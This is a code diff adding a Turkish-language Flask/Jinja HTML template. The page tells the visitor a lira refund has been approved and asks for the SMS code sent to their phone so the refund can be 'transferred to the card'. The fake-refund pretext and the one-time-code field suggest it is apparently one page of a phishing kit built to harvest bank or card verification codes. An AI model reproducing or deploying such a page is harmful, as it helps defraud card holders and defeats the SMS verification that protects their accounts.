@@ -1,0 +1,24 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="richText">
+    TL iade tutarınız belirlendi. İade hakkınızı kartınıza geri aktarmak için lütfen telefonunuza gönderilen SMS şifresini giriniz.
+</div>
+<form method="post" id="smsForm" autocomplete="off">
+    <fieldset>
+        <div class="formRow required">
+            <label for="smsField" class="rowLabel">SMS Şifreniz</label>
+            <div class="fieldGroup">
+                <input name="sms1" id="smsField" type="tel" maxlength="10" class="text" required>
+                <p>Lütfen telefonunuza gönderilen sms şifresini giriniz.</p>
+            </div>
+        </div>
+    </fieldset>
+    <div class="loader is-hidden">
+        <img src="{{ url_for('static', filename='img/form-progress.svg') }}" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
+    </div>
+    <div class="formSubmitRow">
+        <button type="submit" class="submitButton">İadeyi Kartıma Aktar</button>
+        <button type="button" class="backButton" onclick="window.history.back()">İptal Et</button>
+    </div>
+</form>
+{% endblock %}
